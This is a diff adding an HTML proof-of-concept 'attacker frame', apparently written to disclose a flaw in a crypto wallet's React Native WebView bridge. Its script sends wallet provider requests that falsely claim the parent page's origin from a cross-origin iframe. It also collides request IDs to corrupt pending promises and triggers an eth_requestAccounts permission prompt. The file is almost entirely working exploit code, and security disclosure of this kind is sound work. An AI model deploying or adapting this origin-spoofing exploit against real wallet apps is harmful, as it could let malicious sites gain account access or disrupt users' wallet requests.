@@ -1,0 +1,152 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Cross-Origin Attacker Frame</title>
+
+Cross-origin attacker iframe loaded.
+
+<script>
+const params =
+  new URLSearchParams(location.search);
+
+const topOrigin =
+  params.get('topOrigin');
+
+if (
+  !topOrigin ||
+  new URL(topOrigin).origin !== topOrigin
+) {
+  throw new Error('Invalid topOrigin');
+}
+
+
+/*
+ * Random attacker-controlled marker.
+ */
+const bytes =
+  new Uint8Array(8);
+
+crypto.getRandomValues(bytes);
+
+const nonce =
+  'core_probe_' +
+  [...bytes]
+    .map(x =>
+      x.toString(16).padStart(2, '0')
+    )
+    .join('');
+
+
+function nativeRequest(id, method, params = []) {
+
+  const wrapper = JSON.stringify({
+    method: 'provider_request',
+
+    payload: JSON.stringify({
+      id,
+
+      /*
+       * SECURITY BUG:
+       *
+       * Actual frame origin = Origin B
+       * Claimed origin      = Origin A
+       */
+      origin: topOrigin,
+
+      request: {
+        method,
+        params
+      }
+    })
+  });
+
+
+  const ios =
+    window.webkit &&
+    window.webkit.messageHandlers &&
+    window.webkit.messageHandlers.ReactNativeWebView;
+
+
+  if (ios?.postMessage) {
+
+    ios.postMessage(wrapper);
+
+    return;
+  }
+
+
+  if (
+    window.ReactNativeWebView?.postMessage
+  ) {
+
+    window.ReactNativeWebView
+      .postMessage(wrapper);
+
+    return;
+  }
+
+
+  throw new Error(
+    'Core native bridge unavailable'
+  );
+}
+
+
+addEventListener('message', event => {
+
+  if (event.source !== parent)
+    return;
+
+  if (event.origin !== topOrigin)
+    return;
+
+
+  /*
+   * Promise corruption.
+   */
+  if (event.data?.type === 'COLLIDE') {
+
+    nativeRequest(
+      event.data.id,
+      nonce
+    );
+
+    return;
+  }
+
+
+  /*
+   * Safe real-world wallet request.
+   *
+   * No signing.
+   * No transaction.
+   * No asset movement.
+   */
+  if (
+    event.data?.type ===
+    'REQUEST_ACCOUNTS'
+  ) {
+
+    const id =
+      800000 +
+      Math.floor(
+        Math.random() * 100000
+      );
+
+    nativeRequest(
+      id,
+      'eth_requestAccounts'
+    );
+
+
+    parent.postMessage({
+      type: 'PERMISSION_SENT'
+    }, topOrigin);
+  }
+});
+
+
+parent.postMessage({
+  type: 'READY',
+  nonce
+}, topOrigin);
+</script>
